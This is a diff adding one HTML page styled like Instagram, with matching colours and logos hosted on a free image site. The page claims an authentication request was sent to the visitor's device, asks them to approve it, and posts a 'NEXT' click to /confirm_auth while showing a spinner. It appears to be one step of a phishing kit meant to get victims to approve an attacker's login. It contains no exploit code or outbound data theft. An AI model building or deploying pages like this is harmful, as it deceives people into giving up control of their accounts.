@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication Required</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(to right, #fbc2eb, #a6c0fe);
+            background-size: 200% 200%;
+            animation: gradientAnimation 4s ease infinite; /* Faster animation */
+            color: #333;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .container {
+            background-color: #ffffff;
+            padding: 20px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+            border-radius: 12px;
+            max-width: 90%;
+            width: 100%;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+            position: relative;
+        }
+
+        .logo {
+            display: block;
+            margin: 0 auto 20px auto;
+            max-width: 100px;
+            opacity: 0.9;
+            transition: display 0.5s ease;
+        }
+
+        .rotating-logo {
+            display: none; /* Hidden by default */
+            max-width: 60px; /* Initial smaller size */
+            animation: rotateReverse 2s linear infinite;
+            transition: max-width 0.5s ease, margin-top 0.5s ease; /* Transition for size and margin-top */
+            margin-top: 50px; /* Initial margin */
+        }
+
+        @keyframes rotateReverse {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(-360deg); } /* Counterclockwise rotation */
+        }
+
+        h1 {
+            color: #262626;
+            font-size: 20px;
+            margin-bottom: 15px;
+            transition: margin-top 0.5s ease; /* Transition for margin-top change */
+        }
+
+        p {
+            color: #555;
+            font-size: 14px;
+            margin: 0 0 60px 0;
+            line-height: 1.6;
+            text-align: center;
+        }
+
+        .divider {
+            width: 80%;
+            height: 1px;
+            background-color: #d3d3d3;
+            margin: 10px 0;
+        }
+
+        button {
+            background-color: #0095f6;
+            color: #ffffff;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #007bb5;
+            transform: scale(1.05);
+        }
+
+        .see-more {
+            margin-top: 10px;
+            color: #007bb5;
+            font-size: 14px;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.upload.ee/image/16962149/1723477166272.png" alt="Current Logo" class="logo" id="currentLogo">
+        <img src="https://www.upload.ee/image/16962511/1723484926099.png" alt="Rotating Logo" class="rotating-logo" id="rotatingLogo">
+        <h1 id="header">Authentication Required</h1>
+        <p>Login requires authentication, and we have sent you an authentication request on your device. Please approve the request.</p>
+        <div class="divider"></div>
+        <form action="/confirm_auth" method="post">
+            <button type="submit" onclick="replaceLogo()">NEXT</button>
+        </form>
+        <div class="see-more">See More</div>
+    </div>
+
+    <script>
+        function replaceLogo() {
+            // Hide the current logo and show the rotating logo
+            document.getElementById('currentLogo').style.display = 'none';
+            var rotatingLogo = document.getElementById('rotatingLogo');
+            rotatingLogo.style.display = 'block';
+            rotatingLogo.style.maxWidth = '60px'; // Smaller size
+
+            // Increase margin-top for the header and adjust the rotating logo's margin-top
+            document.getElementById('header').style.marginTop = '50px'; // Increased margin
+            rotatingLogo.style.marginTop = '20px'; // Adjusted space between rotating logo and header
+        }
+    </script>
+</body>
+</html>
